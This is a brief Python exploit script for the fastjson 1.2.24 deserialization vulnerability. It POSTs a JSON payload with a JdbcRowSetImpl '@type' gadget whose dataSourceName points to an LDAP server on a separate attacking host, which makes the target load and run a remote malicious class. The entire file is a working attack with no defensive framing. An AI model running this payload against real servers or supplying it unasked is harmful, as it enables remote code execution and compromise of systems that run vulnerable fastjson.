#!/usr/bin/env python3
# This one is for fastjson 1.2.24 attack

import requests
import json

ATTACKING_HOST = '10.160.0.10'
SIMPLE_HTTP_PORT = 9000
JNDI_PORT = 9999
TARGET_HOST = '10.160.0.254'
TARGET_PORT = 8090
TARGET_URL = 'http://{}:{}'.format(TARGET_HOST, TARGET_PORT)
MALICIOUS_CLASS = 'Attacker'

PAYLOAD = {
    "att_payload": {
        "@type": "com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName": "ldap://" + ATTACKING_HOST + ":" + str(JNDI_PORT) + "/" + MALICIOUS_CLASS,
        "autoCommit": True
    }
}
r = requests.post(TARGET_URL, data = json.dumps(PAYLOAD))
# You can choose either one, no need to import json if the following one is chosen
#r = requests.post(TARGET_URL, json = PAYLOAD)
print('Status result: \n\tReturn code: {}\n\tResponse: {}\n'.format(r.status_code, r.json()))
